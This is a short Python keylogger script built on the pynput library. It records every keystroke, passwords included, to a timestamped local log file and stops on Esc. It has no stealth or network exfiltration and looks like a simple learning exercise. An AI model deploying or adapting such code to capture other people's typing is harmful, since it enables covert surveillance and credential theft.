import pynput   
import datetime

from pynput.keyboard import Key, Listener

date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

def on_press (key):
    print ("{0} pressed".format(key))
    write_file(key)

def write_file(keys):
    with open ("log{}.txt".format(date), "a") as f :
            k = str(keys).replace("'","")
            if  keys == Key.space:
                f.write(' ')
            if  keys == Key.enter:
                f.write('%ENTER%')
                f.write('\n')
            if keys == Key.backspace:
                f.write("%BORRAR%")
            elif k.find ("Key") == -1:
                f.write(k)

def on_release (key):
    if key == Key.esc:
        return False

with Listener (on_press = on_press, on_release = on_release) as listener:
    listener.join()